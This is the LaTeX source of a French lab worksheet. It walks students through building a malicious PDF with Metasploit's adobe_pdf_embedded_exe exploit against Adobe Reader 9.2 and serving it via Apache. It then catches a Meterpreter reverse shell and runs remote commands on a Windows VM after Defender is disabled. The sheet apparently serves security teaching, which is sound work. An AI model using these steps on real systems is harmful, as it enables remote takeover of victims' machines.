@@ -1,0 +1,113 @@
+\documentclass{article}
+\usepackage[a4paper,left=1.5cm, right=1.5cm, top=1cm, bottom=2cm]{geometry}
+\usepackage{tikz,tcolorbox}
+\usepackage{amsmath}
+\usepackage[table,xcdraw]{xcolor}
+\usepackage{listings}
+\usepackage{array,multirow} % For customizing tables
+\usepackage{booktabs} % For better horizontal lines
+\usepackage{makecell}
+\setlength{\parindent}{0pt}
+
+\lstset{
+    language=SQL,                    % Set language to SQL
+    basicstyle=\ttfamily\small,      % Font size and family for code
+    keywordstyle=\color{blue}\bfseries, % Color for SQL keywords
+    commentstyle=\color{gray},       % Color for comments
+    stringstyle=\color{red},         % Color for strings
+    numbers=left,                    % Show line numbers on the left
+    numberstyle=\tiny\color{gray},   % Line number font and color
+    stepnumber=1,                    % Line number step
+    breaklines=true,                 % Wrap long lines
+    frame=single,                    % Add a frame around code
+    tabsize=2,                       % Set tab size
+    showstringspaces=false           % Hide spaces in strings
+}
+
+
+\newcommand{\ques}[1]{
+  \section*{Question #1}
+  \vspace{-0.5cm}
+  \noindent\rule{\textwidth}{0.5pt}%
+}
+
+\newcommand{\tit}[1]{
+\begin{center}
+    \Large{\textbf{{#1}}}
+\end{center}
+}
+
+\definecolor{commentgray}{HTML}{676160}
+\definecolor{messagegreen}{HTML}{17B867}
+\definecolor{myblue}{HTML}{10C2C4}
+
+\tcbuselibrary{skins, breakable, theorems}
+
+
+\newtcolorbox{prettyBox}[2]{
+  enhanced,
+  colback=white!90!#2,   % Background color based on the second parameter (color)
+  colframe=#2!60!black,  % Frame color based on the second parameter (color)
+  coltitle=white,        % Title color (white)
+  fonttitle=\bfseries\Large,
+  title=#1,              % Title from the first parameter
+  boxrule=1mm,
+  arc=0.5mm,
+  drop shadow=#2!35!gray, % Drop shadow color based on the second parameter (color)
+}
+
+
+
+\begin{document}
+\tit{TP N\(^{\boldsymbol{\circ}}\)\hspace{0.1cm}1}
+
+\vspace{0.5cm}
+
+\begin{enumerate}
+    \item Lancer les deux machines virtuelles kali linux et windows , et assure la connectiviter avec la commande \texttt{ping} .
+\item Desactiver windows defender et le par-feu de la machine virtuelle windows , pourquoi les desactiver ? 
+\item Installer adobe reader 9.2 sur la machine virtuelle windows
+\item On va utilier metasploit dans kali linux taper les commandes suivant :
+\begin{itemize}
+    \item \texttt{msfconsole} pour lancer l'interface de commande principale de Metasploit.
+    \item \texttt{use exploit/windows/fileformat/adobe\_pdf\_embedded\_exe} pour sélectionner l'exploit qui permet d'intégrer un exécutable malveillant dans un fichier PDF.
+    \item \texttt{show options} pour afficher tous les paramètres configurables de l'exploit sélectionné.
+    \item \texttt{set LAUNCH\_MESSAGE <message pour inciter la victime à ouvrir le fichier pdf>} pour définir le message qui apparaîtra à l'ouverture du PDF afin d'inciter l'utilisateur à exécuter le code malveillant.
+    \item \texttt{exploit} pour lancer la création du fichier malveillant , comment s'appelle-t-il "evil.pdf".
+\end{itemize}
+
+\item On souhaite transférer ce fichier malveillant sur la machine de la victime. Comment procéder ? Nous allons utiliser Apache pour accomplir cela. Ouvrez un terminal en tant que root sur Kali et exécutez les commandes suivantes :
+    \begin{itemize}
+        \item \texttt{service apache2 start} pour démarre le serveur Apache
+        \item \texttt{cp <chemin/evil.pdf> /var/www/html} : que fait cette commande ? 
+        \item \texttt{ls /var/www/html} : vous devriez voir le fichier \texttt{evil.pdf} listé dans ce répertoire.
+    \end{itemize}
+    \begin{itemize}
+        \item Depuis la machine Windows, ouvrez un navigateur et saisissez l'URL suivante : \texttt{IP\_KALI/evil.pdf} afin de télécharger et installer le fichier \texttt{evil.pdf}.
+    \end{itemize}
+
+\item Revenez sur la machine Kali et exécutez les commandes suivantes :
+    \begin{itemize}
+        \item \texttt{use exploit/multi/handler} : sélectionne l'exploit générique permettant de gérer les connexions entrantes provenant du payload , c'est quoi un handler et payload ?
+        \item \texttt{set payload windows/meterpreter/reverse\_tcp} : définit le payload utilisé pour établir une connexion inverse (reverse shell) depuis la machine cible Windows vers Kali Linux via TCP , c'est quoi reverse shell?
+        \item \texttt{show options} : affiche les options actuelles du payload. Vérifiez que l'option \texttt{LHOST} correspond bien à l'adresse IP de votre machine Kali. Si ce n'est pas le cas, utilisez la commande : \texttt{set LHOST <IP\_KALI>}. Assurez-vous également que \texttt{LPORT} est configuré sur 4444.
+        \item \texttt{exploit} : lance l'écoute et attend que la victime ouvre le fichier malveillant pour établir la connexion Meterpreter.
+    \end{itemize}
+ 
+    \begin{itemize}
+        \item Depuis votre machine Windows, ouvrez le fichier \texttt{evil.pdf} avec Adobe 9.2. Si Adobe vous propose 
+    d'enregistrer un fichier nommé \texttt{template.pdf}, choisissez le même emplacement que le fichier 
+    \texttt{evil.pdf}. Quel est le message affiché après avoir cliqué sur \texttt{Enregistrer} ? 
+    Ouvrez ensuite le fichier \texttt{template.pdf}.
+    \end{itemize}
+
+\item Que remarquez-vous sur la machine Kali Linux ? Exécutez les commandes suivantes sur la machine Kali :
+    \begin{itemize}
+        \item \texttt{pwd} : que fait cette commande ?
+        \item \texttt{execute -f notepad.exe} : exécute l'application \texttt{notepad.exe} sur la machine Windows depuis Kali.
+        \item \texttt{keyboard\_send "Bonjour Je Suis Un Attaquant"} : que remarquez-vous sur le bloc-notes ouvert sur la machine Windows ?
+        \item \texttt{ps} : que fait cette commande ?
+        \item \texttt{kill <PID>} : permet de tuer n'importe quel processus actif sur la machine Windows depuis Kali en spécifiant son PID (Process ID).
+    \end{itemize}
+\end{enumerate}
+\end{document}
